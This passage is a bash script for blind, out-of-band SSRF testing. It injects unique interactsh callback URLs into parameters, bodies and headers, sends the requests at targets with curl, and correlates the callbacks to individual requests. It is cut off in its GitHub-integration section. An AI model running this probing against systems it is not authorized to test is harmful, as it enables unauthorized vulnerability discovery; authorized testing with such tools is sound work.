#!/usr/bin/env bash
#
# ssrf_oob.sh -- blind / out-of-band SSRF callback helper.
#
# Fires every candidate request at a target with a UNIQUE per-request
# interactsh subdomain label, then correlates the OOB interactions back
# to the exact request that caused them.
#
# Only run this against targets you are authorized to test.

set -uo pipefail

VERSION="4.0"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"

# ----------------------------------------------------------
# Colors (disabled when not a TTY or when NO_COLOR is set)
# ----------------------------------------------------------
if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
    CYAN='\033[1;36m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'
    RED='\033[1;31m'; RESET='\033[0m'
else
    CYAN=''; GREEN=''; YELLOW=''; RED=''; RESET=''
fi

QUIET=0
log()     { [ "$QUIET" -eq 1 ] || echo -e "\n${GREEN}[*]${RESET} $1"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $1"; }
success() { [ "$QUIET" -eq 1 ] || echo -e "${GREEN}[+]${RESET} $1"; }
error()   { echo -e "${RED}[-]${RESET} $1"; }
have()    { command -v "$1" &>/dev/null; }
is_uint() { [[ "${1:-}" =~ ^[0-9]+$ ]]; }

# ----------------------------------------------------------
# Defaults
# ----------------------------------------------------------
LIST_FILE=""
SINGLE_URL=""
METHOD="GET"
METHOD_SET=0
DATA_TEMPLATE=""
EXTRA_HEADERS=()
WAIT_SECONDS=45
POLL_INTERVAL=5
OUTDIR=""
CONCURRENCY=5
SCHEME_MODE="both"     # http | https | bare | both | all
ENCODE=0
AUTO_INSTALL=0
PARAMS_FILE=""
GIT_REPO=""
RUN_ID=""
GH_ISSUE=0
USER_AGENT=""
PROXY=""
COOKIE=""
INSECURE=0
TIMEOUT=15
RETRIES=0
RATE=0
SERVER=""
ITCH_PID=""
TEMP_LIST=""

# Built-in fallback candidate SSRF param names, used ONLY when no
# wordlist file is available and the input line has no FUZZ marker.
DEFAULT_PARAMS=(url uri path dest destination redirect redirect_uri redir
  return return_url returnUrl next target rurl callback cb notify webhook
  ping fetch proxy forward host domain site load src source img image file
  feed continue view show navigation open out to link resource endpoint
  api template page data q query remote server connect addr ip link_url
  avatar picture logo thumbnail import export sync)

DEFAULT_WORDLIST="$SCRIPT_DIR/wordlists/params.txt"

cleanup() {
    [ -n "$ITCH_PID" ] && kill "$ITCH_PID" 2>/dev/null
    [ -n "$TEMP_LIST" ] && rm -f "$TEMP_LIST"
}
trap cleanup EXIT

usage() {
    cat << USAGE
ssrf_oob.sh v${VERSION} -- blind/OOB SSRF callback helper

Usage:
  $0 -u <url> [options]          Test a single URL
  $0 -l <list_file> [options]    Test a list of URLs

Input (one required):
  -u, --url URL           Single target URL. Add FUZZ where the callback
                          goes (e.g. https://target.com/fetch?url=FUZZ).
                          Without FUZZ, auto-expands against the candidate
                          param wordlist (nothing skipped).
  -l, --list FILE         File of target URLs, one per line. Same FUZZ
                          rules as -u apply to each line.

Injection:
  -H "Header: value"      Extra header, repeatable. FUZZ in the value is
                          replaced per request (e.g. -H "X-Forwarded-Host: FUZZ").
  -X METHOD               HTTP method (default: GET, or POST if -d given
                          and -X was not passed explicitly).
  -d, --data TEMPLATE     Request body template containing FUZZ. Implies
                          POST unless -X overrides it.

Payload / request shaping:
  --scheme MODE           http | https | bare | both | all
                          (default: both -- full http:// URL AND bare host,
                          since some apps need a full URL and some just
                          parse a host). "all" adds the https:// variant.
  --encode                URL-encode the callback payload before injection
                          (useful for params that get parsed/decoded twice).
  --params FILE           Override the candidate param wordlist for
                          FUZZ-less input (one param name per line).
  --list-params           Print the candidate param wordlist and exit.
  -t, --timeout SECONDS   Per-request curl timeout (default: 15).
  --retries N             Retry requests that fail at the transport level
                          (default: 0).
  --rate SECONDS          Minimum delay between dispatched requests
                          (forces concurrency 1; default: 0 = no limit).
  -A, --user-agent UA     Custom User-Agent header.
  -x, --proxy URL         Send requests through a proxy (e.g. http://127.0.0.1:8080).
  -b, --cookie STR        Cookie header value to send.
  -k, --insecure          Skip TLS verification for self-signed targets.

OOB engine:
  --server URL            Custom interactsh server (default: public servers).
  --poll-interval SECONDS How often to poll the interaction log for live
                          hits during the grace period (default: 5).

Run control:
  -w, --wait SECONDS      Grace period after sending all requests before
                          final correlation (default: 45). Raise this for
                          targets that process SSRF async (queues/webhooks).
  -c, --concurrency N     Parallel requests (default: 5).
  -o, --outdir DIR        Output directory (default: ssrf_oob_<timestamp>).
  -q, --quiet             Suppress informational output (warnings/errors
                          still shown).
  -y, --yes               Auto-install interactsh-client if missing.

Results / GitHub integration:
  --git-repo PATH         If set and PATH is a git repo, copy results into
                          PATH/findings/ssrf/<id>/ and commit+push.
  --id NAME               Label used for the git-repo findings folder.
  --gh-issue              With --git-repo: also open (or comment on) a
                          GitHub issue in that repo summarizing the run
                          (requires the gh CLI to be authenticated).

  -h, --help              Show this help
  -v, --version           Show version

Examples:
  $0 -u "https://target.com/api/fetch?url=FUZZ"
  $0 -u "https://target.com/api/fetch?url=FUZZ" -H "X-Forwarded-Host: FUZZ"
  $0 -u "https://target.com/api/fetch" -d '{"callback":"FUZZ"}' -X POST
  $0 -u "https://target.com/endpoint" -w 120 --scheme all --encode
  $0 -l urls.txt --git-repo ~/bugbounty-findings --id acme-corp --gh-issue

Output:
  <outdir>/report.txt        Human-readable, one line per candidate tested
  <outdir>/confirmed.json    Only confirmed OOB hits, machine-readable
  <outdir>/noise.json        Unmatched interactions (informational only)
  <outdir>/correlation.tsv   label -> exact request that used it
  <outdir>/send.log          Per-request SENT/FAILED status with HTTP code
  <outdir>/summary.json      Machine-readable run summary
  <outdir>/interactsh.log    Raw interactsh-client JSON stream
USAGE
    exit 0
}

# ----------------------------------------------------------
# Arg parsing
# ----------------------------------------------------------
while [ $# -gt 0 ]; do
    case "$1" in
        -h|--help) usage ;;
        -v|--version) echo "ssrf_oob.sh v${VERSION}"; exit 0 ;;
        -u|--url) SINGLE_URL="${2:-}"; shift 2 ;;
        -l|--list) LIST_FILE="${2:-}"; shift 2 ;;
        -H) EXTRA_HEADERS+=("${2:-}"); shift 2 ;;
        -X) METHOD="${2:-}"; METHOD_SET=1; shift 2 ;;
        -d|--data) DATA_TEMPLATE="${2:-}"; [ "$METHOD_SET" -eq 0 ] && METHOD="POST"; shift 2 ;;
        --scheme) SCHEME_MODE="${2:-}"; shift 2 ;;
        --encode) ENCODE=1; shift ;;
        --params) PARAMS_FILE="${2:-}"; shift 2 ;;
        --list-params) LIST_PARAMS=1; shift ;;
        -w|--wait) WAIT_SECONDS="${2:-}"; shift 2 ;;
        --poll-interval) POLL_INTERVAL="${2:-}"; shift 2 ;;
        -c|--concurrency) CONCURRENCY="${2:-}"; shift 2 ;;
        -o|--outdir) OUTDIR="${2:-}"; shift 2 ;;
        -t|--timeout) TIMEOUT="${2:-}"; shift 2 ;;
        --retries) RETRIES="${2:-}"; shift 2 ;;
        --rate) RATE="${2:-}"; shift 2 ;;
        -A|--user-agent) USER_AGENT="${2:-}"; shift 2 ;;
        -x|--proxy) PROXY="${2:-}"; shift 2 ;;
        -b|--cookie) COOKIE="${2:-}"; shift 2 ;;
        -k|--insecure) INSECURE=1; shift ;;
        --server) SERVER="${2:-}"; shift 2 ;;
        -q|--quiet) QUIET=1; shift ;;
        -y|--yes) AUTO_INSTALL=1; shift ;;
        --git-repo) GIT_REPO="${2:-}"; shift 2 ;;
        --id) RUN_ID="${2:-}"; shift 2 ;;
        --gh-issue) GH_ISSUE=1; shift ;;
        -*) error "Unknown option: $1"; usage ;;
        *) error "Unexpected argument: $1"; usage ;;
    esac
done

# ----------------------------------------------------------
# Validation
# ----------------------------------------------------------
for spec in "wait:$WAIT_SECONDS" "poll-interval:$POLL_INTERVAL" "concurrency:$CONCURRENCY" \
            "timeout:$TIMEOUT" "retries:$RETRIES" "rate:$RATE"; do
    name="${spec%%:*}"; val="${spec#*:}"
    if ! is_uint "$val"; then
        error "--$name expects a non-negative integer, got: '$val'"
        exit 1
    fi
done

if [[ "$SCHEME_MODE" != "http" && "$SCHEME_MODE" != "https" && "$SCHEME_MODE" != "bare" \
      && "$SCHEME_MODE" != "both" && "$SCHEME_MODE" != "all" ]]; then
    error "--scheme must be http, https, bare, both, or all"
    exit 1
fi

[ -n "$METHOD" ] || { error "-X method must not be empty"; exit 1; }

if [ -n "$SINGLE_URL" ] && [ -n "$LIST_FILE" ]; then
    error "Pass either -u/--url OR -l/--list, not both."
    exit 1
fi

if [ -n "$DATA_TEMPLATE" ] && [[ "$DATA_TEMPLATE" != *FUZZ* ]]; then
    error "--data template must contain a FUZZ marker."
    exit 1
fi

for h in "${EXTRA_HEADERS[@]}"; do
    if [[ "$h" != *:* ]]; then
        error "Invalid -H header (expected 'Name: value'): $h"
        exit 1
    fi
done

# ----------------------------------------------------------
# Candidate param wordlist: --params file > bundled wordlist >
# built-in fallback. Nothing is ever silently skipped.
# ----------------------------------------------------------
if [ -n "$PARAMS_FILE" ]; then
    if [ ! -f "$PARAMS_FILE" ]; then
        error "--params: file not found: $PARAMS_FILE"
        exit 1
    fi
    mapfile -t DEFAULT_PARAMS < <(grep -vE '^[[:space:]]*(#|$)' "$PARAMS_FILE")
elif [ -f "$DEFAULT_WORDLIST" ]; then
    mapfile -t DEFAULT_PARAMS < <(grep -vE '^[[:space:]]*(#|$)' "$DEFAULT_WORDLIST")
fi

if [ "${LIST_PARAMS:-0}" -eq 1 ]; then
    printf '%s\n' "${DEFAULT_PARAMS[@]}"
    exit 0
fi

if [ "${#DEFAULT_PARAMS[@]}" -eq 0 ]; then
    error "Candidate param wordlist is empty -- check --params / $DEFAULT_WORDLIST"
    exit 1
fi

# ----------------------------------------------------------
# Input resolution: -u writes a temp file so the rest of the
# pipeline treats single-URL and list mode identically.
# ----------------------------------------------------------
if [ -n "$SINGLE_URL" ]; then
    TEMP_LIST="$(mktemp /tmp/ssrf_oob_url_XXXXXX.txt)"
    printf '%s\n' "$SINGLE_URL" > "$TEMP_LIST"
    LIST_FILE="$TEMP_LIST"
elif [ -n "$LIST_FILE" ] && [ ! -f "$LIST_FILE" ]; then
    error "-l/--list: file not found: $LIST_FILE"
    exit 1
elif [ -z "$LIST_FILE" ]; then
    error "You must pass -u/--url <url> or -l/--list <file>."
    exit 1
fi

[ -z "$OUTDIR" ] && OUTDIR="ssrf_oob_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"
CORR_FILE="$OUTDIR/correlation.tsv"
REPORT_FILE="$OUTDIR/report.txt"
CONFIRMED_FILE="$OUTDIR/confirmed.json"
NOISE_FILE="$OUTDIR/noise.json"
SEND_LOG="$OUTDIR/send.log"
SUMMARY_FILE="$OUTDIR/summary.json"
INTERACTSH_LOG="$OUTDIR/interactsh.log"
JOBS_FILE="$OUTDIR/jobs.tsv"
LIVE_FILE="$OUTDIR/.live_hits"
for f in "$CORR_FILE" "$REPORT_FILE" "$CONFIRMED_FILE" "$NOISE_FILE" "$SEND_LOG" "$JOBS_FILE" "$LIVE_FILE"; do
    : > "$f"
done

# --rate implies sequential dispatch so the delay is meaningful
if [ "$RATE" -gt 0 ] && [ "$CONCURRENCY" -gt 1 ]; then
    warn "--rate is set: forcing --concurrency 1 so the rate limit is honored"
    CONCURRENCY=1
fi

echo -e "${CYAN}=========================================="
echo " SSRF OOB Callback Helper v${VERSION}"
if [ -n "$SINGLE_URL" ]; then
    echo " URL:    $SINGLE_URL"
else
    echo " List:   $LIST_FILE"
fi
echo " Output: $OUTDIR/"
echo "==========================================${RESET}"

# ----------------------------------------------------------
# 1. Make sure we have an OOB engine. interactsh-client is the
#    only supported engine here on purpose: it gives us a real,
#    globally-unique wildcard domain plus a JSON stream we can
#    correlate exactly. A DNS-timing heuristic without a real
#    OOB server would be far more prone to false positives --
#    that tradeoff isn't made here.
# ----------------------------------------------------------
if ! have interactsh-client; then
    if [ "$AUTO_INSTALL" -eq 1 ] && have go; then
        log "Installing interactsh-client..."
        go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
    else
        error "interactsh-client is required and not installed."
        log "Install it with: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
        log "Then re-run with -y to auto-install next time."
        exit 1
    fi
fi

# ----------------------------------------------------------
# 2. Start interactsh-client, capture its assigned domain.
# ----------------------------------------------------------
log "Starting interactsh-client session..."
ITCH_ARGS=(-pi "$POLL_INTERVAL" -json)
[ -n "$SERVER" ] && ITCH_ARGS+=(-server "$SERVER")
interactsh-client "${ITCH_ARGS[@]}" > "$INTERACTSH_LOG" 2>&1 &
ITCH_PID=$!

DOMAIN=""
for _ in $(seq 1 20); do
    DOMAIN=$(grep -oE '[a-z0-9]{10,40}\.oast\.[a-z.]{2,}' "$INTERACTSH_LOG" | head -n1)
    [ -n "$DOMAIN" ] && break
    sleep 1
done
if [ -z "$DOMAIN" ]; then
    error "Could not determine interactsh domain -- check $INTERACTSH_LOG"
    exit 1
fi
success "Session domain: $DOMAIN"

# ----------------------------------------------------------
# Helpers shared with the send_one worker (exported below).
# ----------------------------------------------------------
gen_label() { tr -dc 'a-z0-9' < /dev/urandom | head -c12; }

url_encode() {
    local s="$1"
    if have python3; then
        python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$s"
    elif have jq; then
        jq -rn --arg v "$s" '$v | @uri'
    elif have perl; then
        perl -MURI::Escape -e 'print uri_escape($ARGV[0])' "$s"
    else
        # last-resort fallback: encode the characters that break URLs
        printf '%s' "$s" | sed -e 's/%/%25/g' -e 's/ /%20/g' -e 's/:/%3A/g' -e 's/\//%2F/g' -e 's/?/%3F/g' -e 's/&/%26/g' -e 's/=/%3D/g'
    fi
}

# build_payload <label> <scheme> -> the exact string injected for FUZZ
build_payload() {
    local label="$1" scheme="$2" p cb
    cb="$label.$DOMAIN"
    case "$scheme" in
        http)  p="http://$cb/" ;;
        https) p="https://$cb/" ;;
        bare)  p="$cb" ;;
    esac
    [ "$ENCODE" -eq 1 ] && p="$(url_encode "$p")"
    printf '%s' "$p"
}

schemes_for_mode() {
    case "$SCHEME_MODE" in
        http)  echo "http" ;;
        https) echo "https" ;;
        bare)  echo "bare" ;;
        both)  printf 'http\nbare\n' ;;
        all)   printf 'http\nhttps\nbare\n' ;;
    esac
}

# ----------------------------------------------------------
# 3. Build the correlation table: one row per (line x param x
#    scheme-variant) combination that will actually be sent.
#    Nothing here is skipped or sampled -- every candidate that
#    applies to a line gets a row and, later, a report line.
#    Job rows are TAB-separated so URLs with odd characters are
#    safe.
# ----------------------------------------------------------
TOTAL=0

while IFS= read -r line || [ -n "$line" ]; do
    [ -z "$line" ] && continue
    [[ "$line" =~ ^[[:space:]]*# ]] && continue
    line="${line%$'\r'}"

    if [[ "$line" == *FUZZ* ]]; then
        while IFS= read -r scheme; do
            label=$(gen_label)
            payload=$(build_payload "$label" "$scheme")
            test_url="${line//FUZZ/$payload}"
            printf '%s\t%s\t%s\t%s\tfuzz-marker\t\t\n' \
                "$label" "$scheme" "$test_url" "$line" >> "$CORR_FILE"
            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
                "$label" "$scheme" "$test_url" "$line" "fuzz-marker" "" "" >> "$JOBS_FILE"
            TOTAL=$((TOTAL+1))
        done < <(schemes_for_mode)
    else
        warn "No FUZZ marker in: $line -- expanding against ${#DEFAULT_PARAMS[@]} candidate params instead of skipping it"
        sep="?"; [[ "$line" == *"?"* ]] && sep="&"
        for param in "${DEFAULT_PARAMS[@]}"; do
            while IFS= read -r scheme; do
                label=$(gen_label)
                payload=$(build_payload "$label" "$scheme")
                test_url="${line}${sep}${param}=${payload}"
                printf '%s\t%s\t%s\t%s\tauto-param:%s\t\t\n' \
                    "$label" "$scheme" "$test_url" "$line" "$param" >> "$CORR_FILE"
                printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
                    "$label" "$scheme" "$test_url" "$line" "auto-param:$param" "" "" >> "$JOBS_FILE"
                TOTAL=$((TOTAL+1))
            done < <(schemes_for_mode)
        done
    fi

    # Header-based injection (e.g. X-Forwarded-Host: FUZZ) gets its own
    # jobs when the line itself has no FUZZ marker. When the line DOES
    # have FUZZ, every URL job already carries the FUZZ headers too
    # (send_one replaces FUZZ in all -H values), so separate header
    # jobs would just duplicate those requests.
    if [[ "$line" != *FUZZ* ]]; then
        for h in "${EXTRA_HEADERS[@]}"; do
            [[ "$h" != *FUZZ* ]] && continue
            while IFS= read -r scheme; do
                label=$(gen_label)
                payload=$(build_payload "$label" "$scheme")
                hval="${h//FUZZ/$payload}"
                printf '%s\t%s\t%s\t%s\theader:%s\t%s\n' \
                    "$label" "$scheme" "$line" "$line" "$hval" "$hval" >> "$CORR_FILE"
                printf '%s\t%s\t%s\t%s\t%s\tHEADER\t%s\n' \
                    "$label" "$scheme" "$line" "$line" "header:$hval" "$hval" >> "$JOBS_FILE"
                TOTAL=$((TOTAL+1))
            done < <(schemes_for_mode)
        done
    fi
done < "$LIST_FILE"

if [ "$TOTAL" -eq 0 ]; then
    src="${SINGLE_URL:-$LIST_FILE}"
    error "No test cases generated from: $src -- is it empty or malformed?"
    exit 1
fi
success "Generated $TOTAL correlated test cases (full list in $CORR_FILE)"

# ----------------------------------------------------------
# 4. Fire every request. Every attempt is logged with an
#    explicit SENT/FAILED status -- a curl failure is reported,
#    never silently dropped, so it can't masquerade later as a
#    true negative. Request args are built in an array, so JSON
#    bodies with spaces survive intact.
# ----------------------------------------------------------
log "Sending $TOTAL requests (concurrency: $CONCURRENCY, timeout: ${TIMEOUT}s, retries: $RETRIES)..."

send_one() {
    local job="$1"
    local label scheme url payload body attempt status rc
    local _orig_line _injection _extra _hval
    IFS=$'\t' read -r label scheme url _orig_line _injection _extra _hval <<< "$job"

    payload=$(build_payload "$label" "$scheme")

    local -a args=(-s -o /dev/null -w '%{http_code}' -X "$METHOD" --max-time "$TIMEOUT")
    [ "$INSECURE" -eq 1 ] && args+=(-k)
    [ -n "$USER_AGENT" ] && args+=(-A "$USER_AGENT")
    [ -n "$PROXY" ] && args+=(-x "$PROXY")
    [ -n "$COOKIE" ] && args+=(-b "$COOKIE")
    # EXTRA_HEADERS arrives as a newline-separated string because bash
    # cannot export arrays to the xargs worker shells.
    if [ -n "${EXTRA_HEADERS_NL:-}" ]; then
        local h
        while IFS= read -r h; do
            [ -z "$h" ] && continue
            if [[ "$h" == *FUZZ* ]]; then
                args+=(-H "${h//FUZZ/$payload}")
            else
                args+=(-H "$h")
            fi
        done <<< "$EXTRA_HEADERS_NL"
    fi
    if [ -n "$DATA_TEMPLATE" ]; then
        body="${DATA_TEMPLATE//FUZZ/$payload}"
        args+=(--data "$body")
    fi

    [ "$RATE" -gt 0 ] && sleep "$RATE"

    attempt=0; status=""; rc=1
    while [ "$attempt" -le "$RETRIES" ]; do
        status=$(curl "${args[@]}" "$url" 2>>"$SEND_LOG")
        rc=$?
        [ "$rc" -eq 0 ] && break
        attempt=$((attempt+1))
    done

    if [ "$rc" -eq 0 ]; then
        echo "SENT  label=$label http=$status url=$url" >> "$SEND_LOG"
    else
        echo "FAILED label=$label (curl rc=$rc after $((attempt)) attempt(s)) url=$url" >> "$SEND_LOG"
    fi
}
export -f send_one build_payload url_encode gen_label
export METHOD DATA_TEMPLATE DOMAIN SEND_LOG ENCODE TIMEOUT RETRIES RATE INSECURE
export USER_AGENT PROXY COOKIE
if [ "${#EXTRA_HEADERS[@]}" -gt 0 ]; then
    EXTRA_HEADERS_NL="$(printf '%s\n' "${EXTRA_HEADERS[@]}")"
    export EXTRA_HEADERS_NL
fi

xargs -P "$CONCURRENCY" -d '\n' -I{} bash -c 'send_one "$@"' _ {} < "$JOBS_FILE"

FAILED_COUNT=$(grep -c '^FAILED' "$SEND_LOG" || true)
SENT_COUNT=$(grep -c '^SENT' "$SEND_LOG" || true)
[ "$FAILED_COUNT" -gt 0 ] && warn "$FAILED_COUNT request(s) failed to send -- see $SEND_LOG (reported as UNSENT, never silently dropped)"
success "All requests dispatched ($SENT_COUNT sent, $FAILED_COUNT failed)."

# ----------------------------------------------------------
# 5. Grace period for async/delayed backend processing. Poll
#    the interaction log while waiting so confirmed hits are
#    printed live instead of only at the end.
# ----------------------------------------------------------
log "Waiting ${WAIT_SECONDS}s for out-of-band callbacks (raise -w for targets that process SSRF asynchronously)..."

declare -A LIVE_SEEN=()
seen_lines=0
elapsed=0
while [ "$elapsed" -lt "$WAIT_SECONDS" ]; do
    sleep "$POLL_INTERVAL"
    elapsed=$((elapsed + POLL_INTERVAL))
    total_lines=$(wc -l < "$INTERACTSH_LOG")
    if [ "$total_lines" -gt "$seen_lines" ]; then
        while IFS= read -r jsonline; do
            [ -z "$jsonline" ] && continue
            if have jq; then
                full_id=$(printf '%s' "$jsonline" | jq -r '."full-id" // ."unique-id" // empty' 2>/dev/null)
            else
                full_id=$(printf '%s' "$jsonline" | grep -oE '"full-id":"[^"]+"' | cut -d'"' -f4)
            fi
            [ -z "$full_id" ] && continue
            llabel="${full_id%%.*}"
            if grep -q "^$llabel	" "$CORR_FILE" && [ -z "${LIVE_SEEN[$llabel]:-}" ]; then
                LIVE_SEEN["$llabel"]=1
                echo "$llabel" >> "$LIVE_FILE"
                success "LIVE OOB HIT: $full_id (label=$llabel) -- correlating to the exact request..."
            fi
        done < <(tail -n +"$((seen_lines + 1))" "$INTERACTSH_LOG")
        seen_lines=$total_lines
    fi
done

kill "$ITCH_PID" 2>/dev/null
ITCH_PID=""
sleep 1

# ----------------------------------------------------------
# 6. Correlate. Every interaction's full-id is matched against
#    the known label set. Matches = confirmed. Non-matches =
#    noise, reported separately, never counted as a hit.
#    Duplicate interactions for the same full-id are deduped.
# ----------------------------------------------------------
log "Correlating interactions against known labels..."

if ! have jq; then
    warn "jq not found -- falling back to grep-based matching (less robust). Install jq for reliable JSON parsing."
fi

json_escape() { printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g'; }

declare -A LABEL_SEEN=()
declare -A FULL_SEEN=()
declare -A PROTO_LIST=()
declare -A FAILED_LABELS=()
CONFIRMED_COUNT=0
NOISE_COUNT=0

CONFIRMED_RAW="$OUTDIR/.confirmed.raw"
NOISE_RAW="$OUTDIR/.noise.raw"
: > "$CONFIRMED_RAW"; : > "$NOISE_RAW"

while IFS= read -r jsonline; do
    [ -z "$jsonline" ] && continue
    if have jq; then
        full_id=$(printf '%s' "$jsonline" | jq -r '."full-id" // ."unique-id" // empty' 2>/dev/null)
        protocol=$(printf '%s' "$jsonline" | jq -r '.protocol // "unknown"' 2>/dev/null)
        remote=$(printf '%s' "$jsonline" | jq -r '."remote-address" // "unknown"' 2>/dev/null)
        ts=$(printf '%s' "$jsonline" | jq -r '.timestamp // "unknown"' 2>/dev/null)
    else
        full_id=$(printf '%s' "$jsonline" | grep -oE '"full-id":"[^"]+"' | cut -d'"' -f4)
        protocol=$(printf '%s' "$jsonline" | grep -oE '"protocol":"[^"]+"' | cut -d'"' -f4)
        remote=$(printf '%s' "$jsonline" | grep -oE '"remote-address":"[^"]+"' | cut -d'"' -f4)
        ts=$(printf '%s' "$jsonline" | grep -oE '"timestamp":"[^"]+"' | cut -d'"' -f4)
    fi
    [ -z "$full_id" ] && continue
    [ -n "${FULL_SEEN[$full_id]:-}" ] && continue   # dedupe repeat interactions
    FULL_SEEN["$full_id"]=1
    label="${full_id%%.*}"

    match=$(awk -F'\t' -v l="$label" '$1==l {print; exit}' "$CORR_FILE")
    if [ -n "$match" ]; then
        LABEL_SEEN["$label"]=1
        PROTO_LIST["$label"]="${PROTO_LIST[$label]:+${PROTO_LIST[$label]},}$protocol"
        orig_url=$(printf '%s' "$match" | cut -f3)
        orig_line=$(printf '%s' "$match" | cut -f4)
        injection=$(printf '%s' "$match" | cut -f5)
        if have jq; then
            jq -n --arg label "$label" --arg protocol "$protocol" --arg remote "$remote" \
                  --arg ts "$ts" --arg url "$orig_url" --arg line "$orig_line" --arg inj "$injection" \
                  --arg protos "${PROTO_LIST[$label]}" \
                  '{label:$label, protocol:$protocol, protocols_seen:$protos, remote_address:$remote,
                    timestamp:$ts, test_url:$url, source_line:$line, injection:$inj}' >> "$CONFIRMED_RAW"
        else
            printf '  {"label":"%s","protocol":"%s","remote_address":"%s","timestamp":"%s","test_url":"%s","source_line":"%s","injection":"%s"}\n' \
                "$(json_escape "$label")" "$(json_escape "$protocol")" "$(json_escape "$remote")" \
                "$(json_escape "$ts")" "$(json_escape "$orig_url")" "$(json_escape "$orig_line")" \
                "$(json_escape "$injection")" >> "$CONFIRMED_RAW"
        fi
        CONFIRMED_COUNT=$((CONFIRMED_COUNT+1))
    else
        if have jq; then
            jq -n --arg label "$label" --arg protocol "$protocol" --arg remote "$remote" --arg ts "$ts" \
                  '{label:$label, protocol:$protocol, remote_address:$remote, timestamp:$ts}' >> "$NOISE_RAW"
        else
            printf '  {"label":"%s","protocol":"%s","remote_address":"%s","timestamp":"%s"}\n' \
                "$(json_escape "$label")" "$(json_escape "$protocol")" "$(json_escape "$remote")" "$(json_escape "$ts")" >> "$NOISE_RAW"
        fi
        NOISE_COUNT=$((NOISE_COUNT+1))
    fi
done < "$INTERACTSH_LOG"

if have jq; then
    jq -s '.' "$CONFIRMED_RAW" > "$CONFIRMED_FILE" 2>/dev/null || echo "[]" > "$CONFIRMED_FILE"
    jq -s '.' "$NOISE_RAW" > "$NOISE_FILE" 2>/dev/null || echo "[]" > "$NOISE_FILE"
else
    if [ -s "$CONFIRMED_RAW" ]; then
        { echo "["; sed 's/$/,/' "$CONFIRMED_RAW" | sed '$ s/,$//'; echo "]"; } > "$CONFIRMED_FILE"
    else
        echo "[]" > "$CONFIRMED_FILE"
    fi
    if [ -s "$NOISE_RAW" ]; then
        { echo "["; sed 's/$/,/' "$NOISE_RAW" | sed '$ s/,$//'; echo "]"; } > "$NOISE_FILE"
    else
        echo "[]" > "$NOISE_FILE"
    fi
fi
rm -f "$CONFIRMED_RAW" "$NOISE_RAW"

while IFS= read -r fline; do
    flabel=$(printf '%s' "$fline" | sed -n 's/^FAILED label=\([^ ]*\).*/\1/p')
    [ -n "$flabel" ] && FAILED_LABELS["$flabel"]=1
done < <(grep '^FAILED' "$SEND_LOG" || true)
UNSENT_COUNT=0
for l in "${!FAILED_LABELS[@]}"; do
    [ -z "${LABEL_SEEN[$l]:-}" ] && UNSENT_COUNT=$((UNSENT_COUNT+1))
done

# ----------------------------------------------------------
# 7. Final report -- one line per test case, hit or not. This
#    is the "don't skip, don't hide a negative" guarantee: the
#    full correlation table drives the report, not the hits.
# ----------------------------------------------------------
{
    echo "SSRF OOB Callback Report"
    echo "Generated: $(date)"
    echo "Domain: $DOMAIN"
    echo "Total test cases: $TOTAL"
    echo "Confirmed OOB hits: $CONFIRMED_COUNT"
    echo "Unsent (transport failures): $UNSENT_COUNT"
    echo "Unmatched/noise interactions: $NOISE_COUNT (see noise.json -- not counted as findings)"
    echo "=========================================="
    while IFS=$'\t' read -r label scheme test_url orig_line injection hval; do
        if [ -n "${LABEL_SEEN[$label]:-}" ]; then
            echo "[CONFIRMED] $orig_line  |  $injection  |  $scheme  ->  see confirmed.json (label=$label)"
        elif [ -n "${FAILED_LABELS[$label]:-}" ]; then
            echo "[UNSENT] $orig_line  |  $injection  |  $scheme  (label=$label, curl failed -- see send.log)"
        else
            echo "[no interaction] $orig_line  |  $injection  |  $scheme  (label=$label)"
        fi
    done < "$CORR_FILE"
} > "$REPORT_FILE"

# Machine-readable run summary
if have jq; then
    jq -n --arg version "$VERSION" --arg domain "$DOMAIN" --arg generated "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
          --arg input "${SINGLE_URL:-$LIST_FILE}" --arg outdir "$OUTDIR" \
          --argjson total "$TOTAL" --argjson sent "$SENT_COUNT" --argjson failed "$FAILED_COUNT" \
          --argjson unsent "$UNSENT_COUNT" --argjson confirmed "$CONFIRMED_COUNT" --argjson noise "$NOISE_COUNT" \
          '{version:$version, generated:$generated, domain:$domain, input:$input, outdir:$outdir,
            total_test_cases:$total, sent:$sent, send_failures:$failed, unsent:$unsent,
            confirmed_hits:$confirmed, noise_interactions:$noise,
            files:{report:"report.txt", confirmed:"confirmed.json", noise:"noise.json",
                   correlation:"correlation.tsv", send_log:"send.log", interactsh_log:"interactsh.log"}}' \
          > "$SUMMARY_FILE"
else
    printf '{"version":"%s","generated":"%s","domain":"%s","total_test_cases":%d,"sent":%d,"send_failures":%d,"unsent":%d,"confirmed_hits":%d,"noise_interactions":%d}\n' \
        "$VERSION" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$DOMAIN" "$TOTAL" "$SENT_COUNT" "$FAILED_COUNT" \
        "$UNSENT_COUNT" "$CONFIRMED_COUNT" "$NOISE_COUNT" > "$SUMMARY_FILE"
fi

echo ""
echo -e "${CYAN}=========================================="
if [ "$CONFIRMED_COUNT" -gt 0 ]; then
    success "$CONFIRMED_COUNT CONFIRMED out-of-band interaction(s) -- each traced to exactly one request."
else
    warn "No confirmed interactions. All $TOTAL test cases came back negative."
fi
[ "$UNSENT_COUNT" -gt 0 ] && warn "$UNSENT_COUNT test case(s) could not be sent (UNSENT) -- see $SEND_LOG"
[ "$NOISE_COUNT" -gt 0 ] && warn "$NOISE_COUNT unmatched interaction(s) logged as noise (not counted) -- see $NOISE_FILE"
echo " Full per-candidate report: $REPORT_FILE"
echo " Confirmed hits (JSON):     $CONFIRMED_FILE"
echo " Run summary (JSON):        $SUMMARY_FILE"
echo " Correlation table:         $CORR_FILE"
echo -e "==========================================${RESET}"

# ----------------------------------------------------------
# 8. GITHUB INTEGRATION (optional)
#    Mirrors the --git-repo pattern used by full_recon.sh /
#    daily_recon.sh: copy results into findings/ssrf/<id>/ in the
